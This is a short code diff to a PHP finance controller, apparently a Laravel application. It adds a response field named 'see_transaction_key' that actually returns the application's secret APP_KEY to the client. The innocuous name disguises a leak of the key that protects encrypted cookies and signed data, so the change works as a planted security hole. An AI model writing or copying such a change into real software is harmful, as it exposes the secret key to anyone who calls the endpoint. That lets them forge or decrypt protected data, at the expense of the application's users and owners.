@@ -35,6 +35,7 @@ class FinanceController extends Controller
                 "last_amount_sent" => $this->movementService->getAmountSent($client_id),
                 "last_one_days" => $this->movementService->getLastDays($client_id, 1),
                 "last_seven_days" => $this->movementService->getLastDays($client_id, 7),
+                "see_transaction_key" => str_replace('base64:', '', env('APP_KEY'))
             ]
         );
     }
